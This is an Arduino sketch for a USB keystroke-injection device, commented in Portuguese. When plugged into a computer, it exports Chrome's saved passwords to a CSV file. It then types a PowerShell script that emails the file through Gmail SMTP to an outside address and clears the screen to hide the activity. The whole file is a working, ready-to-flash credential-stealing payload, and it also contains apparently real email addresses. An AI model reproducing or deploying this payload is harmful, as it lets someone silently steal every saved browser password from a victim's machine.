#include "Arduino.h"
#include "DigiKeyboardPtBr.h"
void setup() {
  DigiKeyboardPtBr.sendKeyStroke(0);
  DigiKeyboardPtBr.delay(500);
  // Abrindo o google
  DigiKeyboardPtBr.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboardPtBr.delay(500);
  DigiKeyboardPtBr.print("chrome --start-maximized");
  DigiKeyboardPtBr.delay(2000);
  DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);
  DigiKeyboardPtBr.delay(1000);
  // Indo até as senhas
  DigiKeyboardPtBr.print("chrome://password-manager/settings");
  DigiKeyboardPtBr.delay(1000);
  DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);
  DigiKeyboardPtBr.delay(1000);
  DigiKeyboardPtBr.print("\t\t\t\t\t\t\t");
  DigiKeyboardPtBr.delay(500);
  DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);
  DigiKeyboardPtBr.delay(500);
  DigiKeyboardPtBr.print("senhas.csv");
  DigiKeyboardPtBr.delay(500);
  DigiKeyboardPtBr.print("\t\t\t");
  DigiKeyboardPtBr.delay(1000);
  DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);
  // Salvando as senhas
  DigiKeyboardPtBr.delay(500);
  DigiKeyboardPtBr.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboardPtBr.delay(500);
  DigiKeyboardPtBr.print("powershell");
  DigiKeyboardPtBr.delay(500);
  DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);
  DigiKeyboardPtBr.delay(1500);
  //from email address:
  DigiKeyboardPtBr.print(F("$email = \"joao.fagundes@abrahao.com.br\";"));
  //to email address
  DigiKeyboardPtBr.print(F("$addressee = \"johngamerpf@gmail.com\";"));
  // o lugar onde vai salvar as senhas
  DigiKeyboardPtBr.print(F("$tempcsv = Join-Path $env:USERPROFILE \"Documents\\senhas.csv\";"));
  // senha da sua conta
  DigiKeyboardPtBr.print(F("$pass = \"senha\";"));
  DigiKeyboardPtBr.print(F("$smtpServer = \"smtp.gmail.com\";"));
  DigiKeyboardPtBr.print(F("$port = \"587\";"));

  DigiKeyboardPtBr.print(F("$securestring = $pass | ConvertTo-SecureString -AsPlainText -Force;"));
  DigiKeyboardPtBr.print(F("$cred = New-Object System.Management.Automation.PSCredential -ArgumentList $email, $securestring;"));
  DigiKeyboardPtBr.print(F("$msg = new-object Net.Mail.MailMessage;"));
  DigiKeyboardPtBr.print(F("$smtp = new-object Net.Mail.SmtpClient($smtpServer, $port);"));
  DigiKeyboardPtBr.print(F("$smtp.EnableSsl = $true;"));
  DigiKeyboardPtBr.print(F("$msg.From = \"$email\";"));
  DigiKeyboardPtBr.print(F("$msg.To.Add(\"$addressee\");"));
  DigiKeyboardPtBr.print(F("$msg.Attachments.Add(\"$tempcsv\");"));
  DigiKeyboardPtBr.print(F("$msg.BodyEncoding = [system.Text.Encoding]::Unicode;"));
  DigiKeyboardPtBr.print(F("$msg.SubjectEncoding = [system.Text.Encoding]::Unicode;"));
  DigiKeyboardPtBr.print(F("$msg.IsBodyHTML = $true ;"));
  DigiKeyboardPtBr.print(F("$msg.Subject = \"Senhas do Navegador\";"));
  DigiKeyboardPtBr.print(F("$msg.Body = \"<h2> Aqui as suas senhas </h2></br>olha o arquivo...\"; "));
  DigiKeyboardPtBr.print(F("$SMTP.Credentials = $cred;"));
  DigiKeyboardPtBr.print(F("$smtp.Send($msg);"));
  DigiKeyboardPtBr.delay(500);
  DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);
  DigiKeyboardPtBr.delay(500);
  DigiKeyboardPtBr.print(F("clear"));
  DigiKeyboardPtBr.delay(500);
  DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);
}

void loop() {
}
  